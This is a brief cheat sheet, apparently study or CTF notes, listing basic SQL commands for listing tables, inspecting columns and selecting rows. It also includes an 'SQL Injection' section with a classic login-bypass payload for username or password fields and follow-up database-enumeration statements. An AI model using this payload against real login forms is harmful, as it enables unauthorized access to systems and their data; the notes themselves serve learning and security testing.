Basic SQL Queries

Listing tables:

~~~sql
.tables
~~~

Showing Contents of Specific Tables:

~~~sql
PRAGMA table_info(TABLENAME);
~~~

Showing information from Specific Tables:

~~~sql
SELECT * from tablename;
~~~

SQL Injection

Simple SQLi query for use in Username or Password field

~~~sql
' or 1=1 -- -
~~~

~~~sql
SHOW DATABASES;

USE database;

SHOW TABLES;

DESCRIBE table;

SELECT field FROM table-content;
~~~
